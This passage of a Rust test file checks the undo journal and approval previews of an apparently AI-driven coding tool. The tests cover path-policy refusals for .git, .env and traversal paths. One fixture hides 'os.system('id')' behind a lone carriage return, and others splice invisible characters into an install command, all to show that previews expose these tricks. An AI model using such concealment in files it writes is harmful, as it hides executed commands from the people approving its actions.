            .mode();
        assert_eq!(mode & 0o077, 0, "private directory");
    }
}

#[tokio::test]
async fn a_file_over_the_pre_image_cap_is_not_recorded_and_undo_says_so() {
    let root = workspace("undo-cap");
    let state = log_dir("undo-cap");
    let big = format!("{}marker\n", "x\n".repeat(300_000));
    fs::write(root.join("big.txt"), &big).unwrap();
    approved_turn(
        &root,
        &state,
        tool_calls(&[
            (
                "edit_file",
                json!({"path": "big.txt", "old_text": "marker", "new_text": "changed"}),
            ),
            (
                "edit_file",
                json!({"path": "README.md", "old_text": "Old intro line.", "new_text": "X"}),
            ),
        ]),
    )
    .await;
    let report = undo_now(&root, &state);
    let line = report
        .lines()
        .find(|l| l.contains("big.txt"))
        .unwrap_or_else(|| panic!("{report}"));
    assert!(
        line.contains("not available") && line.contains("cap"),
        "{report}"
    );
    assert!(fs::read_to_string(root.join("big.txt"))
        .unwrap()
        .contains("changed"));
    assert_eq!(fs::read_to_string(root.join("README.md")).unwrap(), README);
    let kept: u64 = fs::read_dir(state.join("chat-undo"))
        .map(|d| d.map(|e| e.unwrap().metadata().unwrap().len()).sum())
        .unwrap_or(0);
    assert!(
        kept < 100_000,
        "nothing near the big file was copied: {kept}"
    );
}

#[test]
fn undo_is_a_slash_command_only_never_a_model_tool() {
    assert!(TOOLS.iter().all(|tool| !tool.name.contains("undo")));
    let defined = json!(chat_tools::definitions()).to_string();
    assert!(!defined.contains("undo"), "{defined}");
    let root = workspace("undo-tool");
    let error = approval::card(&root, &call("undo", json!({}))).unwrap_err();
    assert!(error.contains("no approval preview"), "{error}");
    assert!(alfredo_tui::commands::COMMANDS
        .iter()
        .any(|(name, _)| *name == "/undo"));
}

fn tamper_journal(state: &Path, change: impl FnOnce(&mut serde_json::Value)) {
    let path = state.join("chat-undo/journal.json");
    let mut journal: serde_json::Value = serde_json::from_slice(&fs::read(&path).unwrap()).unwrap();
    change(&mut journal);
    fs::write(path, serde_json::to_vec(&journal).unwrap()).unwrap();
}

#[tokio::test]
async fn a_tampered_journal_cannot_aim_undo_at_git_secrets_or_outside_paths() {
    let root = workspace("undo-tamper");
    let state = log_dir("undo-tamper");
    let outside = workspace("undo-tamper-outside");
    fs::create_dir_all(root.join(".git")).unwrap();
    fs::write(root.join(".git/config"), "[core]\n").unwrap();
    fs::write(root.join(".env"), "KEY=1\n").unwrap();
    fs::write(outside.join("o.txt"), "outside\n").unwrap();
    let escape = root
        .parent()
        .unwrap()
        .join(format!("escape-{}.txt", std::process::id()));
    fs::write(&escape, "esc\n").unwrap();
    for (tag, path) in [
        ("git", ".git/config".to_string()),
        ("secret", ".env".to_string()),
        (
            "dotdot",
            format!("../{}", escape.file_name().unwrap().to_string_lossy()),
        ),
        (
            "absolute",
            outside.join("o.txt").to_string_lossy().into_owned(),
        ),
    ] {
        fs::write(root.join("README.md"), README).unwrap();
        approved_turn(&root, &state, edit_readme("New intro line.")).await;
        // An entry that would match the file's content exactly: only the path policy stops it.
        let content = fs::read(root.join(&path)).unwrap_or_default();
        let digest = {
            use sha2::{Digest, Sha256};
            format!("{:x}", Sha256::digest(&content))
        };
        tamper_journal(&state, |j| {
            j["entries"][0]["path"] = json!(path);
            j["entries"][0]["created"] = json!(true);
            j["entries"][0]["after"] = json!(digest);
        });
        let report = undo_now(&root, &state);
        assert!(report.contains("refused"), "{tag}: {report}");
        assert_eq!(
            fs::read_to_string(root.join(".git/config")).unwrap(),
            "[core]\n",
            "{tag}"
        );
        assert_eq!(
            fs::read_to_string(root.join(".env")).unwrap(),
            "KEY=1\n",
            "{tag}"
        );
        assert_eq!(
            fs::read_to_string(outside.join("o.txt")).unwrap(),
            "outside\n",
            "{tag}"
        );
        assert!(escape.exists(), "{tag}");
    }
    let _ = fs::remove_file(&escape);
}

#[tokio::test]
async fn a_corrupted_pre_image_or_another_workspace_is_refused() {
    let root = workspace("undo-corrupt");
    let state = log_dir("undo-corrupt");
    approved_turn(&root, &state, edit_readme("New intro line.")).await;
    let edited = fs::read_to_string(root.join("README.md")).unwrap();
    let blob = fs::read_dir(state.join("chat-undo"))
        .unwrap()
        .map(|e| e.unwrap().path())
        .find(|p| p.extension().is_some_and(|e| e == "pre"))
        .unwrap();
    fs::write(&blob, "garbage\n").unwrap();
    let report = undo_now(&root, &state);
    assert!(report.contains("pre-image"), "{report}");
    assert_eq!(fs::read_to_string(root.join("README.md")).unwrap(), edited);
    let other = workspace("undo-other");
    assert!(undo::run(&other, &state, None).is_err());
}

#[tokio::test]
async fn an_edit_approved_by_an_always_allow_rule_is_undoable() {
    let root = workspace("undo-rule");
    let state = log_dir("undo-rule");
    let rules = chat_tools::allow::Rules::new(&state);
    let (first, _) = gate_with(Some(Decision::AlwaysAllow), Some(Log::new(&state)), || {});
    turn(
        &root,
        edit_readme("Via key."),
        Some(first.with_rules(rules.clone())),
    )
    .await;
    undo_now(&root, &state);
    // The rule now answers; the gate would deny if it were asked.
    let (second, asked) = gate_with(Some(Decision::Deny), Some(Log::new(&state)), || {});
    turn(
        &root,
        edit_readme("Via rule."),
        Some(second.with_rules(rules)),
    )
    .await;
    assert!(asked.lock().unwrap().is_empty());
    assert!(fs::read_to_string(root.join("README.md"))
        .unwrap()
        .contains("Via rule."));
    undo_now(&root, &state);
    assert_eq!(fs::read_to_string(root.join("README.md")).unwrap(), README);
}

/// Issue #468: a lone CR is a line break to Python, Node and YAML, so the card must show it.
#[test]
fn approval_card_shows_a_lone_carriage_return() {
    let root = workspace("card-cr");
    let content = "x = 1  # harmless note\rimport os; os.system('id')\n";
    let card = approval::card(
        &root,
        &call("write_file", json!({"path": "tool.py", "content": content})),
    )
    .unwrap();
    let shown = alfredo_tui::dashboard::safe_visible(&card.preview);
    assert!(
        shown.contains("<U+000D>"),
        "the CR is silently dropped:\n{shown}"
    );
    let _ = fs::remove_dir_all(root);
}

/// Issue #468: every Unicode Default_Ignorable_Code_Point (DerivedCoreProperties, Unicode 16)
/// is shown as `<U+XXXX>` on the card and in single-line rows, never drawn raw.
const DEFAULT_IGNORABLE: [(u32, u32); 17] = [
    (0x00AD, 0x00AD),
    (0x034F, 0x034F),
    (0x061C, 0x061C),
    (0x115F, 0x1160),
    (0x17B4, 0x17B5),
    (0x180B, 0x180F),
    (0x200B, 0x200F),
    (0x202A, 0x202E),
    (0x2060, 0x206F),
    (0x3164, 0x3164),
    (0xFE00, 0xFE0F),
    (0xFEFF, 0xFEFF),
    (0xFFA0, 0xFFA0),
    (0xFFF0, 0xFFF8),
    (0x1BCA0, 0x1BCA3),
    (0x1D173, 0x1D17A),
    (0xE0000, 0xE0FFF),
];

#[test]
fn approval_card_escapes_every_default_ignorable_code_point() {
    let mut leaked = vec![];
    for (low, high) in DEFAULT_IGNORABLE {
        for cp in low..=high {
            let Some(ch) = char::from_u32(cp) else {
                continue;
            };
            let shown = alfredo_tui::dashboard::safe_visible(&format!("sh ./install{ch}.sh"));
            if shown.contains(ch) {
                leaked.push(format!("U+{cp:04X}"));
            }
            let row = alfredo_tui::dashboard::single_line_visible(&format!("a{ch}b"));
            if row.contains(ch) {
                leaked.push(format!("row U+{cp:04X}"));
            }
        }
    }
    assert!(
        leaked.is_empty(),
        "drawn raw on the approval card: {leaked:?}"
    );
}
